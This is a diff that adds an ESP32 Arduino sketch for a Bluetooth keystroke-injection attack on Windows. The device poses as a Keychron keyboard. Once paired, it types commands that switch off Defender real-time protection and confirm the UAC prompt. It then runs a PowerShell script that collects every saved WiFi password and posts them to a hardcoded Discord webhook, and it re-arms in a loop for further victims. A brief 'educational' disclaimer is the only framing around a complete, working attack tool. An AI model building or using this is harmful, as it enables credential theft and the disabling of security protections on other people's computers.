@@ -1,0 +1,863 @@
+/**
+ * ╔═══════════════════════════════════════════════════════════════╗
+ * ║  BLE Ducky v2 (SPAM) — ESP32 Bluetooth HID Keyboard Emulator║
+ * ║  Target: Windows 10/11  |  Board: ESP32 DevKit V1           ║
+ * ║  For educational / CTF / authorized security testing only.  ║
+ * ╚═══════════════════════════════════════════════════════════════╝
+ *
+ * HOW IT WORKS:
+ *   1. ESP32 advertises as "BLE Ducky" (a Bluetooth keyboard)
+ *   2. You pair from Windows → it connects immediately
+ *   3. After ~2.5s (HID enumeration guard), it executes the payload
+ *   4. Payload: Win+R → PowerShell → data harvest → Discord webhook
+ *   5. After execution, ESP32 re-advertises and waits for the NEXT
+ *      connection — loops forever (spam mode).
+ *   6. Each trigger increments a counter — see Serial Monitor.
+ *
+ * ================================================================
+ * QUICK START (for impatient people):
+ * ================================================================
+ * 1. Install Arduino IDE + ESP32 board package (see guide below)
+ * 2. Open this file in Arduino IDE
+ * 3. Set your Discord webhook URL in generate_payload.ps1, then run it
+ *    OR use the default placeholder (payload won't work until you do)
+ * 4. Select Tools → Board → "ESP32 Dev Module"
+ * 5. Click ✓ (verify) then → (upload)
+ * 6. Power the ESP32, pair as "BLE Ducky" from Windows Bluetooth settings
+ * 7. Watch the LED: slow blink = waiting, rapid = connected, solid = typing!
+ *
+ * ================================================================
+ * TABLE OF CONTENTS (Ctrl+F to jump):
+ * ================================================================
+ *   SECTION A — User Configuration (edit these!) ........ line ~70
+ *   SECTION B — Includes & Payload Data ................ line ~105
+ *   SECTION C — HID Keycodes (do not edit) ............ line ~115
+ *   SECTION D — State Machine .......................... line ~195
+ *   SECTION E — HID Typing Engine ...................... line ~220
+ *   SECTION F — BLE Initialization & Callbacks ........ line ~360
+ *   SECTION G — Payload Execution ...................... line ~410
+ *   SECTION H — LED & State Management ................. line ~460
+ *   SECTION I — Arduino setup() / loop() ............... line ~510
+ *   SECTION J — generate_payload.ps1 (embedded) ....... line ~550
+ */
+
+// ================================================================
+// SECTION A — USER CONFIGURATION  (edit these before compiling!)
+// ================================================================
+
+// --- BLE Identity ---
+#define BLE_DEVICE_NAME       "Keychron K2"   // Name shown when pairing
+#define BLE_MANUFACTURER      "Keychron"      // Manufacturer string
+
+// --- Discord Webhook (REPLACE THIS BEFORE UPLOADING!) ---
+// Copy your Discord webhook URL here. No separate generator needed.
+#define WEBHOOK_URL           "https://discord.com/api/webhooks/1529092585690235001/hKcOWgJg4F4qOOdy_pnzaorPg_gU_w-N3ih93j6PzbJec4NDFxlyttPDCkIA4_tmhrKE"
+
+// Bluetooth SIG Appearance sub-category values (what Windows uses for icon):
+//   0x03C1 = Keyboard       0x0340 = Generic Audio
+//   0x0345 = Loudspeaker    0x0346 = Headphones
+//   0x0341 = Headset        0x0000 = Unknown
+#define BLE_APPEARANCE        0x03C1           // Keyboard appearance
+
+// --- Timing (milliseconds) ---
+#define ENUM_GUARD_MS         4000            // Wait after BLE connect before typing (ms).
+                                                // First pairing takes ~4s for Windows HID driver setup. Reconnects are faster.
+#define KEY_DELAY_MS          6               // Delay between each keystroke (5-15ms)
+#define LINE_DELAY_MS         120             // Delay after pressing Enter
+#define MODIFIER_DELAY_MS     60              // Delay for modifier combos (Win+R, Ctrl+V)
+#define TAB_DELAY_MS          80              // Delay between rapid Tab presses
+
+// --- Test Mode ---
+// Set TEST_MODE = 1 to type "Hello" into Notepad instead of running the real payload.
+// Great for first-time testing! On the target PC, open Notepad before pairing.
+#define TEST_MODE             0               // 0 = real payload, 1 = Notepad test
+
+// --- Spam Mode (always on) ---
+// The ESP32 never sleeps — after each payload execution it immediately
+// goes back to advertising. Reconnects trigger the payload again.
+// This creates a loop: advertise → connect → execute → advertise → ...
+#define SPAM_INTERVAL_MS      2000            // Pause between runs (ms)
+
+// --- LED Pin ---
+#define STATUS_LED_PIN        GPIO_NUM_2      // ESP32 built-in LED (D2 on DevKit V1)
+
+
+// ================================================================
+// SECTION B — INCLUDES & PAYLOAD DATA
+// ================================================================
+#include <Arduino.h>
+#include <BLEDevice.h>
+#include <BLEHIDDevice.h>
+#include <BLE2902.h>
+
+// Embedded PowerShell payload (PROGMEM).
+// The WEBHOOK_URL macro is substituted at compile time — just edit it in
+// SECTION A and upload. No external generator needed.
+const char PAYLOAD_SCRIPT[] PROGMEM =
+    "$a=netsh wlan show profiles|Select-String 'All User Profile';"
+    " $r=@();"
+    " $a|%{"
+    "  $n=$_-replace'.*:\\s+','';"
+    "  $p=netsh wlan show profile name=\"$n\" key=clear|Select-String 'Key Content';"
+    "  $r+=@{SSID=$n;Password=if($p){$p-replace'.*:\\s+',''}else{'[OPEN]'}}"
+    " };"
+    " $u='" WEBHOOK_URL "';"
+    " $m=@{content=\"WiFi: $(( $r|ConvertTo-Json -Compress ))\"};"
+    " Invoke-RestMethod $u -Method Post -ContentType 'application/json'"
+    "  -Body ($m|ConvertTo-Json) -ErrorAction SilentlyContinue;";
+
+
+// ================================================================
+// SECTION C — HID KEYCODES  (USB HID Usage Tables v1.12)
+// ================================================================
+// Modifier masks  (OR them together for combos like Ctrl+Shift)
+#define HID_MOD_LCTRL         0x01
+#define HID_MOD_LSHIFT        0x02
+#define HID_MOD_LALT          0x04
+#define HID_MOD_LGUI          0x08            // Left Windows key
+#define HID_MOD_RCTRL         0x10
+#define HID_MOD_RSHIFT        0x20
+#define HID_MOD_RALT          0x40
+#define HID_MOD_RGUI          0x80
+
+// Keycodes  (only the ones we need; full list in USB HID spec)
+#define HID_KEY_NONE          0x00
+#define HID_KEY_A             0x04
+#define HID_KEY_B             0x05
+#define HID_KEY_C             0x06
+#define HID_KEY_D             0x07
+#define HID_KEY_E             0x08
+#define HID_KEY_F             0x09
+#define HID_KEY_G             0x0A
+#define HID_KEY_H             0x0B
+#define HID_KEY_I             0x0C
+#define HID_KEY_J             0x0D
+#define HID_KEY_K             0x0E
+#define HID_KEY_L             0x0F
+#define HID_KEY_M             0x10
+#define HID_KEY_N             0x11
+#define HID_KEY_O             0x12
+#define HID_KEY_P             0x13
+#define HID_KEY_Q             0x14
+#define HID_KEY_R             0x15
+#define HID_KEY_S             0x16
+#define HID_KEY_T             0x17
+#define HID_KEY_U             0x18
+#define HID_KEY_V             0x19
+#define HID_KEY_W             0x1A
+#define HID_KEY_X             0x1B
+#define HID_KEY_Y             0x1C
+#define HID_KEY_Z             0x1D
+#define HID_KEY_1             0x1E
+#define HID_KEY_2             0x1F
+#define HID_KEY_3             0x20
+#define HID_KEY_4             0x21
+#define HID_KEY_5             0x22
+#define HID_KEY_6             0x23
+#define HID_KEY_7             0x24
+#define HID_KEY_8             0x25
+#define HID_KEY_9             0x26
+#define HID_KEY_0             0x27
+#define HID_KEY_ENTER         0x28
+#define HID_KEY_ESC           0x29
+#define HID_KEY_BACKSPACE     0x2A
+#define HID_KEY_TAB           0x2B
+#define HID_KEY_SPACE         0x2C
+#define HID_KEY_MINUS         0x2D            // -  and  _
+#define HID_KEY_EQUAL         0x2E            // =  and  +
+#define HID_KEY_LEFT_BRACE    0x2F            // [  and  {
+#define HID_KEY_RIGHT_BRACE   0x30            // ]  and  }
+#define HID_KEY_BACKSLASH     0x31            // \  and  |
+#define HID_KEY_SEMICOLON     0x33            // ;  and  :
+#define HID_KEY_APOSTROPHE    0x34            // '  and  "
+#define HID_KEY_GRAVE         0x35            // `  and  ~
+#define HID_KEY_COMMA         0x36            // ,  and  <
+#define HID_KEY_DOT           0x37            // .  and  >
+#define HID_KEY_SLASH         0x38            // /  and  ?
+#define HID_KEY_DELETE        0x4C
+#define HID_KEY_F1            0x3A
+#define HID_KEY_F2            0x3B
+#define HID_KEY_F3            0x3C
+#define HID_KEY_F4            0x3D
+#define HID_KEY_F5            0x3E
+#define HID_KEY_F6            0x3F
+#define HID_KEY_F7            0x40
+#define HID_KEY_F8            0x41
+#define HID_KEY_F9            0x42
+#define HID_KEY_F10           0x43
+#define HID_KEY_F11           0x44
+#define HID_KEY_F12           0x45
+#define HID_KEY_LEFT_ARROW    0x50
+#define HID_KEY_DOWN_ARROW    0x51
+#define HID_KEY_RIGHT_ARROW   0x52
+#define HID_KEY_UP_ARROW      0x53
+
+
+// ================================================================
+// SECTION D — STATE MACHINE
+// ================================================================
+enum class DuckyState : uint8_t {
+    IDLE,          // Just powered on
+    ADVERTISING,   // Waiting for BLE pair (slow blink)
+    CONNECTED,     // BLE connected (rapid blink)
+    ENUM_GUARD,    // Waiting for HID enumeration (rapid blink)
+    TYPING,        // Payload is being typed (solid LED)
+    COMPLETE,      // Done! Going back to advertising (short flash)
+    ERROR          // Disconnected — re-advertising (fast flash)
+};
+
+DuckyState    currentState     = DuckyState::IDLE;
+unsigned long stateStartTime   = 0;
+bool          payloadExecuted  = false;
+
+// BLE globals
+BLEHIDDevice* hid    = nullptr;
+BLEServer*    server = nullptr;
+BLECharacteristic* hidInput = nullptr;        // Input report characteristic
+
+// Run counter — increments every time payload executes
+unsigned long runCount      = 0;
+unsigned long lastRunTime   = 0;
+
+
+// ================================================================
+// SECTION E — HID TYPING ENGINE
+// ================================================================
+// Maps ASCII characters to HID keycodes + modifiers.
+// US keyboard layout. If your target uses a different layout,
+// some symbols may type wrong characters.
+
+struct CharMap {
+    char      ascii;
+    uint8_t   modifier;
+    uint8_t   keycode;
+};
+
+// Characters that need Shift pressed
+static const CharMap shiftedChars[] = {
+    {'~', HID_MOD_LSHIFT, HID_KEY_GRAVE},
+    {'!', HID_MOD_LSHIFT, HID_KEY_1},
+    {'@', HID_MOD_LSHIFT, HID_KEY_2},
+    {'#', HID_MOD_LSHIFT, HID_KEY_3},
+    {'$', HID_MOD_LSHIFT, HID_KEY_4},
+    {'%', HID_MOD_LSHIFT, HID_KEY_5},
+    {'^', HID_MOD_LSHIFT, HID_KEY_6},
+    {'&', HID_MOD_LSHIFT, HID_KEY_7},
+    {'*', HID_MOD_LSHIFT, HID_KEY_8},
+    {'(', HID_MOD_LSHIFT, HID_KEY_9},
+    {')', HID_MOD_LSHIFT, HID_KEY_0},
+    {'_', HID_MOD_LSHIFT, HID_KEY_MINUS},
+    {'+', HID_MOD_LSHIFT, HID_KEY_EQUAL},
+    {'{', HID_MOD_LSHIFT, HID_KEY_LEFT_BRACE},
+    {'}', HID_MOD_LSHIFT, HID_KEY_RIGHT_BRACE},
+    {'|', HID_MOD_LSHIFT, HID_KEY_BACKSLASH},
+    {':', HID_MOD_LSHIFT, HID_KEY_SEMICOLON},
+    {'"', HID_MOD_LSHIFT, HID_KEY_APOSTROPHE},
+    {'<', HID_MOD_LSHIFT, HID_KEY_COMMA},
+    {'>', HID_MOD_LSHIFT, HID_KEY_DOT},
+    {'?', HID_MOD_LSHIFT, HID_KEY_SLASH},
+};
+
+// Characters that DON'T need Shift
+static const CharMap unshiftedChars[] = {
+    {'a', 0, HID_KEY_A}, {'b', 0, HID_KEY_B}, {'c', 0, HID_KEY_C},
+    {'d', 0, HID_KEY_D}, {'e', 0, HID_KEY_E}, {'f', 0, HID_KEY_F},
+    {'g', 0, HID_KEY_G}, {'h', 0, HID_KEY_H}, {'i', 0, HID_KEY_I},
+    {'j', 0, HID_KEY_J}, {'k', 0, HID_KEY_K}, {'l', 0, HID_KEY_L},
+    {'m', 0, HID_KEY_M}, {'n', 0, HID_KEY_N}, {'o', 0, HID_KEY_O},
+    {'p', 0, HID_KEY_P}, {'q', 0, HID_KEY_Q}, {'r', 0, HID_KEY_R},
+    {'s', 0, HID_KEY_S}, {'t', 0, HID_KEY_T}, {'u', 0, HID_KEY_U},
+    {'v', 0, HID_KEY_V}, {'w', 0, HID_KEY_W}, {'x', 0, HID_KEY_X},
+    {'y', 0, HID_KEY_Y}, {'z', 0, HID_KEY_Z},
+    {'1', 0, HID_KEY_1}, {'2', 0, HID_KEY_2}, {'3', 0, HID_KEY_3},
+    {'4', 0, HID_KEY_4}, {'5', 0, HID_KEY_5}, {'6', 0, HID_KEY_6},
+    {'7', 0, HID_KEY_7}, {'8', 0, HID_KEY_8}, {'9', 0, HID_KEY_9},
+    {'0', 0, HID_KEY_0},
+    {' ', 0, HID_KEY_SPACE},
+    {'-', 0, HID_KEY_MINUS},
+    {'=', 0, HID_KEY_EQUAL},
+    {'[', 0, HID_KEY_LEFT_BRACE},
+    {']', 0, HID_KEY_RIGHT_BRACE},
+    {'\\', 0, HID_KEY_BACKSLASH},
+    {';', 0, HID_KEY_SEMICOLON},
+    {'\'', 0, HID_KEY_APOSTROPHE},
+    {'`', 0, HID_KEY_GRAVE},
+    {',', 0, HID_KEY_COMMA},
+    {'.', 0, HID_KEY_DOT},
+    {'/', 0, HID_KEY_SLASH},
+};
+
+// Search a CharMap array for a character
+static int findCharMap(const CharMap* map, int count, char c) {
+    for (int i = 0; i < count; i++) {
+        if (map[i].ascii == c) return i;
+    }
+    return -1;
+}
+
+// ─── Core HID Functions ────────────────────────────────────────
+
+/**
+ * Send a key press+release HID report.
+ * Uses notify() to push the report to the connected host.
+ */
+void sendKey(uint8_t modifier, uint8_t keycode, uint16_t holdMs) {
+    if (!hid) { Serial.println("[HID] sendKey: hid is null!"); return; }
+    if (!hidInput) { Serial.println("[HID] sendKey: hidInput is null!"); return; }
+
+    uint8_t report[8] = { modifier, 0, keycode, 0, 0, 0, 0, 0 };
+    hidInput->setValue(report, 8);
+    hidInput->notify();
+    delay(holdMs);
+
+    uint8_t release[8] = { 0, 0, 0, 0, 0, 0, 0, 0 };
+    hidInput->setValue(release, 8);
+    hidInput->notify();
+}
+
+/**
+ * Type a single ASCII character.
+ */
+void typeChar(char c) {
+    // Uppercase letters → Shift + letter
+    if (c >= 'A' && c <= 'Z') {
+        sendKey(HID_MOD_LSHIFT, HID_KEY_A + (c - 'A'), 20);
+        delay(KEY_DELAY_MS);
+        return;
+    }
+
+    // Check shifted symbols (!, @, #, $, etc.)
+    int idx = findCharMap(shiftedChars, sizeof(shiftedChars) / sizeof(shiftedChars[0]), c);
+    if (idx >= 0) {
+        sendKey(shiftedChars[idx].modifier, shiftedChars[idx].keycode, 20);
+        delay(KEY_DELAY_MS);
+        return;
+    }
+
+    // Check unshifted characters (a-z, 0-9, space, etc.)
+    idx = findCharMap(unshiftedChars, sizeof(unshiftedChars) / sizeof(unshiftedChars[0]), c);
+    if (idx >= 0) {
+        sendKey(0, unshiftedChars[idx].keycode, 20);
+        delay(KEY_DELAY_MS);
+        return;
+    }
+
+    // Unknown character → skip silently
+}
+
+/**
+ * Type a null-terminated ASCII string.
+ */
+void typeString(const char* str) {
+    if (!str) return;
+    while (*str) {
+        typeChar(*str);
+        str++;
+    }
+}
+
+/**
+ * Type a string followed by Enter.
+ */
+void typeLine(const char* str) {
+    typeString(str);
+    sendKey(0, HID_KEY_ENTER, 20);
+    delay(LINE_DELAY_MS);
+}
+
+/**
+ * Press a modifier+key combo (e.g., Win+R, Ctrl+V).
+ */
+void typeModifierKey(uint8_t modifier, uint8_t keycode) {
+    sendKey(modifier, keycode, MODIFIER_DELAY_MS);
+    delay(MODIFIER_DELAY_MS);
+}
+
+/**
+ * Type the raw PowerShell script from PROGMEM (flash memory).
+ * The script is stored as a single line in PAYLOAD_SCRIPT (from payload.h).
+ * We type it directly into the open PowerShell window and press Enter to execute.
+ */
+void typeScript() {
+    size_t len = strlen_P(PAYLOAD_SCRIPT);
+    for (size_t i = 0; i < len; i++) {
+        char c = (char)pgm_read_byte(&PAYLOAD_SCRIPT[i]);
+        typeChar(c);
+        delay(KEY_DELAY_MS);
+    }
+}
+
+
+// ================================================================
+// SECTION F — BLE INITIALIZATION & CALLBACKS
+// ================================================================
+
+void setState(DuckyState newState);
+void startAdvertising();
+
+/**
+ * Debug callbacks for the HID input characteristic.
+ * Prints notification status to Serial so we can diagnose delivery failures.
+ */
+class HIDInputCallbacks : public BLECharacteristicCallbacks {
+    void onStatus(BLECharacteristic* pChar, Status s, uint32_t code) override {
+        const char* statusStr;
+        switch (s) {
+            case SUCCESS_NOTIFY:       statusStr = "SUCCESS_NOTIFY"; break;
+            case ERROR_NOTIFY_DISABLED: statusStr = "NOTIFY_DISABLED"; break;
+            case ERROR_NO_CLIENT:      statusStr = "NO_CLIENT"; break;
+            case ERROR_NO_SUBSCRIBER:  statusStr = "NO_SUBSCRIBER"; break;
+            default:                   statusStr = "OTHER"; break;
+        }
+        Serial.printf("[HID] notify status: %s (code=%lu)\n", statusStr, code);
+    }
+};
+
+class MyServerCallbacks : public BLEServerCallbacks {
+    /**
+     * Called when a Windows device pairs and connects to us.
+     */
+    void onConnect(BLEServer* s) override {
+        setState(DuckyState::CONNECTED);
+        Serial.println("[BLE] + Device connected");
+    }
+
+    /**
+     * Called when the connection drops.
+     * In SPAM mode: always go back to advertising immediately.
+     * The device is always ready for the next connection.
+     */
+    void onDisconnect(BLEServer* s) override {
+        payloadExecuted = false;
+        setState(DuckyState::ADVERTISING);
+        Serial.println("[BLE] - Disconnected, re-advertising (spam mode)");
+        startAdvertising();
+    }
+};
+
+/**
+ * Initialize BLE as a HID Keyboard device.
+ */
+void initBLE() {
+    BLEDevice::init(BLE_DEVICE_NAME);
+    BLEDevice::setPower(ESP_PWR_LVL_P9);       // Max transmit power
+
+    Serial.printf("[BLE] Device name: '%s'\n", BLE_DEVICE_NAME);
+
+    server = BLEDevice::createServer();
+    server->setCallbacks(new MyServerCallbacks());
+
+    hid = new BLEHIDDevice(server);
+    hid->manufacturer()->setValue(BLE_MANUFACTURER);
+    // Core 3.x: hidInfo(country, flags) — bcdHID is hardcoded to 1.11 in library
+    // flags: 0x03 = RemoteWake + NormallyConnectable
+    hid->hidInfo(0, 0x03);
+
+    // Standard keyboard report descriptor (63 bytes)
+    // Defines: 8 modifier bits + 1 reserved byte + 5 LED bits + 3 LED padding + 6 keycode bytes
+    static const uint8_t hidDescriptor[] = {
+        0x05, 0x01,        // Usage Page (Generic Desktop)
+        0x09, 0x06,        // Usage (Keyboard)
+        0xA1, 0x01,        // Collection (Application)
+        0x05, 0x07,        //   Usage Page (Key Codes)
+        0x19, 0xE0,        //   Usage Minimum (224)
+        0x29, 0xE7,        //   Usage Maximum (231)
+        0x15, 0x00,        //   Logical Minimum (0)
+        0x25, 0x01,        //   Logical Maximum (1)
+        0x75, 0x01,        //   Report Size (1)
+        0x95, 0x08,        //   Report Count (8)
+        0x81, 0x02,        //   Input (Data, Variable, Absolute) — modifier byte
+        0x95, 0x01,        //   Report Count (1)
+        0x75, 0x08,        //   Report Size (8)
+        0x81, 0x01,        //   Input (Constant) — reserved byte
+        0x95, 0x05,        //   Report Count (5)
+        0x75, 0x01,        //   Report Size (1)
+        0x05, 0x08,        //   Usage Page (LEDs)
+        0x19, 0x01,        //   Usage Minimum (Num Lock)
+        0x29, 0x05,        //   Usage Maximum (Kana)
+        0x91, 0x02,        //   Output (Data, Variable, Absolute) — LED report
+        0x95, 0x01,        //   Report Count (1)
+        0x75, 0x03,        //   Report Size (3)
+        0x91, 0x01,        //   Output (Constant) — LED padding
+        0x95, 0x06,        //   Report Count (6)
+        0x75, 0x08,        //   Report Size (8)
+        0x15, 0x00,        //   Logical Minimum (0)
+        0x25, 0x65,        //   Logical Maximum (101)
+        0x05, 0x07,        //   Usage Page (Key Codes)
+        0x19, 0x00,        //   Usage Minimum (0)
+        0x29, 0x65,        //   Usage Maximum (101)
+        0x81, 0x00,        //   Input (Data, Array) — keycode array
+        0xC0               // End Collection
+    };
+    hid->reportMap((uint8_t*)hidDescriptor, sizeof(hidDescriptor));
+    Serial.printf("[BLE] Report descriptor: %u bytes\n", sizeof(hidDescriptor));
+
+    // Create HID input report (for sending keystrokes to the host)
+    // NOTE: Core 3.3.10's inputReport() already adds BLE2902 + Report Reference
+    // descriptors internally — do NOT add another BLE2902 here!
+    hidInput = hid->inputReport(0);
+    if (!hidInput) {
+        Serial.println("[FATAL] inputReport() returned null!");
+    } else {
+        // ═══════════════════════════════════════════════════════════════
+        // Force-enable notifications so notify() doesn't silently drop.
+        // Core 3.3.10's notify() checks BLE2902.getNotifications() and
+        // returns early if false — even when the client is connected.
+        // ═══════════════════════════════════════════════════════════════
+        BLE2902* p2902 = (BLE2902*)hidInput->getDescriptorByUUID(BLEUUID((uint16_t)0x2902));
+        if (p2902) {
+            p2902->setNotifications(true);
+            Serial.println("[BLE] Notifications force-enabled on input report");
+        } else {
+            Serial.println("[WARN] No BLE2902 found on input report");
+        }
+
+        // Register debug callback to trace notification delivery
+        hidInput->setCallbacks(new HIDInputCallbacks());
+    }
+
+    // Create HID output report (for receiving LED states from host — optional)
+    hid->outputReport(0);
+
+    hid->startServices();
+
+    // ═══════════════════════════════════════════════════════════════
+    // CRITICAL: Security must use BOND mode for Windows HID
+    // ═══════════════════════════════════════════════════════════════
+    // Windows HID keyboards REQUIRE bonding to store pairing keys.
+    //   ESP_LE_AUTH_NO_BOND  → causes "Code 10 (device cannot start)"
+    //   ESP_LE_AUTH_BOND     → Windows accepts the HID device
+    //
+    //   ESP_IO_CAP_NONE      → "Just Works" pairing (no PIN prompt)
+    //   setSecuredConnection → Enable LE Secure Connections (modern pairing)
+    //
+    // This is the most common fix for the Code 10 error on Windows.
+    // ═══════════════════════════════════════════════════════════════
+    BLESecurity* security = new BLESecurity();
+    // bonding=true, mitm=false, sc=true → Just Works pairing with Secure Connections
+    security->setAuthenticationMode(true, false, true);
+    security->setCapability(ESP_IO_CAP_NONE);
+
+    Serial.println("[BLE] HID device initialized (BOND mode)");
+}
+
+/**
+ * Start BLE advertising aggressively so Windows discovers us fast.
+ * In spam mode: very short advertising intervals for rapid discovery.
+ */
+void startAdvertising() {
+    if (!server) return;
+
+    BLEAdvertising* adv = BLEDevice::getAdvertising();
+    adv->setAppearance(BLE_APPEARANCE);           // Controls Bluetooth icon in Windows
+    adv->addServiceUUID(hid->hidService()->getUUID());
+    adv->setScanResponse(true);
+    adv->setMinPreferred(0x02);                 // ~1.25ms — fastest BLE allows
+    adv->setMaxPreferred(0x10);                 // ~10ms
+    adv->start();
+
+    setState(DuckyState::ADVERTISING);
+    Serial.printf("[BLE] Advertising as '%s'\n", BLE_DEVICE_NAME);
+}
+
+
+// ================================================================
+// SECTION G — PAYLOAD EXECUTION
+// ================================================================
+
+/**
+ * Press a key N times with a delay between each press.
+ */
+void pressKeyRepeated(uint8_t keycode, uint8_t count) {
+    for (uint8_t i = 0; i < count; i++) {
+        sendKey(0, keycode, 20);
+        delay(TAB_DELAY_MS);
+    }
+}
+
+
+/**
+ * Execute the payload on the target Windows machine.
+ *
+ * STRATEGY: step-by-step HID keystrokes — no embedded scripts.
+ *
+ *   Phase 1: Open Windows Security and disable Real-time protection
+ *     Win+R → "windowsdefender://" → Enter   (open Windows Security)
+ *     5s wait
+ *     Tab × 10 → Enter                       (click "Virus & threat protection")
+ *     3s wait
+ *     Tab × 14 → Enter                       (click "Manage settings")
+ *     3s wait
+ *     Tab × 6 → Space                        (toggle OFF Real-time protection)
+ *     2s wait
+ *
+ *   Phase 2: Open PowerShell and harvest WiFi
+ *     Win+R → "powershell" → Enter
+ *     Type the WiFi-only harvest script (PAYLOAD_SCRIPT) → Enter
+ *     4s wait
+ */
+void executePayload() {
+    Serial.println("[PAYLOAD] Starting...");
+    setState(DuckyState::TYPING);
+
+#if TEST_MODE
+    Serial.println("[TEST] Test mode — Calculator");
+    typeModifierKey(HID_MOD_LGUI, HID_KEY_R);
+    delay(600);
+    typeLine("calc");
+    Serial.println("[TEST] Calculator should open — HID OK");
+    delay(800);
+    Serial.println("[TEST] Done");
+
+#else
+    // ─── PHASE 1: Disable Defender via HID GUI navigation ────
+
+    // Open Windows Security directly to threat settings (where the toggle is)
+    Serial.println("[PAYLOAD] Opening Defender threat settings...");
+    typeModifierKey(HID_MOD_LGUI, HID_KEY_R);
+    delay(600);
+    typeLine("windowsdefender://threatsettings/");
+    delay(4000);                              // Wait for page to load
+
+    // Toggle OFF Real-time protection (first switch on the page)
+    Serial.println("[PAYLOAD] Toggling OFF Real-time protection...");
+    sendKey(0, HID_KEY_SPACE, 50);
+    delay(1500);                              // Wait for UAC prompt to appear
+
+    // Confirm UAC: Left Arrow to focus "Yes", then Enter
+    Serial.println("[PAYLOAD] Confirming UAC...");
+    sendKey(0, HID_KEY_LEFT_ARROW, 50);
+    delay(150);
+    sendKey(0, HID_KEY_ENTER, 50);
+    delay(800);
+
+    // ─── PHASE 2: Open PowerShell & Harvest WiFi ─────────────
+
+    Serial.println("[PAYLOAD] Opening PowerShell for WiFi harvest...");
+    typeModifierKey(HID_MOD_LGUI, HID_KEY_R);
+    delay(600);
+    typeLine("powershell");
+    delay(2000);
+
+    // Type the WiFi harvest script from PROGMEM
+    Serial.printf("[PAYLOAD] Typing %u chars of WiFi script...\n", strlen_P(PAYLOAD_SCRIPT));
+    typeScript();
+
+    // Press Enter to execute
+    delay(30);
+    sendKey(0, HID_KEY_ENTER, 50);
+    delay(LINE_DELAY_MS);
+    Serial.println("[PAYLOAD] WiFi harvest executing...");
+
+    delay(3000);
+#endif
+
+    setState(DuckyState::COMPLETE);
+    payloadExecuted = true;
+    runCount++;
+    Serial.printf("[PAYLOAD] Done  |  Total runs: %lu\n", runCount);
+}
+
+
+// ================================================================
+// SECTION H — LED & STATE MANAGEMENT  (SPAM MODE — never sleeps)
+// ================================================================
+
+void setState(DuckyState newState) {
+    currentState = newState;
+    stateStartTime = millis();
+
+    switch (currentState) {
+        case DuckyState::TYPING:
+            digitalWrite(STATUS_LED_PIN, HIGH);    // Solid ON
+            break;
+        case DuckyState::COMPLETE:
+            // Quick triple-blink to signal completion, then loop() re-advertises
+            for (int i = 0; i < 3; i++) {
+                digitalWrite(STATUS_LED_PIN, HIGH); delay(60);
+                digitalWrite(STATUS_LED_PIN, LOW);  delay(60);
+            }
+            break;
+        default:
+            break;                                  // Handled in loop() + updateStatusLED()
+    }
+}
+
+unsigned long lastLEDToggle = 0;
+
+/**
+ * Non-blocking LED pattern updates.
+ * Called every loop() iteration.
+ */
+void updateStatusLED() {
+    unsigned long now = millis();
+
+    switch (currentState) {
+        case DuckyState::ADVERTISING:
+            // Slow blink: 1s on, 1s off
+            if (now - lastLEDToggle >= 1000) {
+                digitalWrite(STATUS_LED_PIN, !digitalRead(STATUS_LED_PIN));
+                lastLEDToggle = now;
+            }
+            break;
+
+        case DuckyState::CONNECTED:
+        case DuckyState::ENUM_GUARD:
+            // Rapid blink: 200ms on, 200ms off
+            if (now - lastLEDToggle >= 200) {
+                digitalWrite(STATUS_LED_PIN, !digitalRead(STATUS_LED_PIN));
+                lastLEDToggle = now;
+            }
+            break;
+
+        case DuckyState::COMPLETE:
+            // Short flash every 500ms to signal "between runs" in spam loop
+            if (now - lastLEDToggle >= 500) {
+                digitalWrite(STATUS_LED_PIN, !digitalRead(STATUS_LED_PIN));
+                lastLEDToggle = now;
+            }
+            break;
+
+        case DuckyState::ERROR:
+            // Error pattern: 3 fast flashes (100ms) then 1s pause
+            {
+                const int flashCount   = 3;
+                const int flashDuration = 100;
+                const int pauseDuration = 1000;
+                unsigned long cycle = (flashDuration * 2 * flashCount) + pauseDuration;
+                unsigned long pos = (now - stateStartTime) % cycle;
+                if (pos < flashDuration * 2 * flashCount) {
+                    digitalWrite(STATUS_LED_PIN,
+                        (pos % (flashDuration * 2)) < flashDuration ? HIGH : LOW);
+                } else {
+                    digitalWrite(STATUS_LED_PIN, LOW);
+                }
+                lastLEDToggle = now;
+            }
+            break;
+
+        default:
+            break;
+    }
+}
+
+
+// ================================================================
+// SECTION I — ARDUINO ENTRY POINTS
+// ================================================================
+
+void setup() {
+    Serial.begin(115200);
+    delay(1000);
+    Serial.println();
+    Serial.println("╔═══════════════════════════════════╗");
+    Serial.println("║  BLE Ducky v2  SPAM MODE  STARTUP ║");
+    Serial.println("╚═══════════════════════════════════╝");
+    Serial.println("Spam mode: loops forever — advertise → connect → execute → repeat");
+    Serial.printf("Min advertising interval: %.2fms\n", 0.625 * 2);
+    Serial.println();
+
+#if TEST_MODE
+    Serial.println("*** TEST MODE ***");
+    Serial.println("Open Notepad on the target PC before pairing.");
+#else
+    size_t pLen = strlen_P(PAYLOAD_SCRIPT);
+    Serial.printf("Payload: %u chars raw script in PROGMEM\n", pLen);
+    if (pLen < 100) {
+        Serial.println("WARNING: Payload seems too short!");
+        Serial.println("Did you forget to run generate_payload.ps1?");
+    }
+#endif
+
+    pinMode(STATUS_LED_PIN, OUTPUT);
+    digitalWrite(STATUS_LED_PIN, LOW);
+
+    initBLE();
+    startAdvertising();
+
+    Serial.println("[SYSTEM] Spam loop started — waiting for BLE connection");
+    Serial.println();
+}
+
+void loop() {
+    updateStatusLED();
+
+    switch (currentState) {
+        case DuckyState::ADVERTISING:
+            // Nothing to do — waiting for onConnect callback
+            break;
+
+        case DuckyState::CONNECTED:
+            // Immediately transition to enumeration guard
+            setState(DuckyState::ENUM_GUARD);
+            break;
+
+        case DuckyState::ENUM_GUARD:
+            // Wait for HID enumeration to complete, then execute payload
+            if (millis() - stateStartTime >= ENUM_GUARD_MS) {
+                if (!payloadExecuted) {
+                    executePayload();
+                }
+            }
+            break;
+
+        case DuckyState::TYPING:
+            // Payload is being typed — executePayload() handles timing
+            break;
+
+        case DuckyState::COMPLETE:
+            // SPAM MODE: brief pause, then re-advertise for the next victim
+            if (millis() - stateStartTime >= SPAM_INTERVAL_MS) {
+                Serial.printf("[SYSTEM] Run #%lu complete — re-advertising\n", runCount);
+                delay(100);
+                payloadExecuted = false;
+                startAdvertising();
+            }
+            break;
+
+        case DuckyState::ERROR:
+            // Show error blink, then go back to advertising
+            if (millis() - stateStartTime >= 5000) {
+                Serial.println("[SYSTEM] Error recovery — re-advertising");
+                payloadExecuted = false;
+                startAdvertising();
+            }
+            break;
+
+        default:
+            break;
+    }
+}
+
+
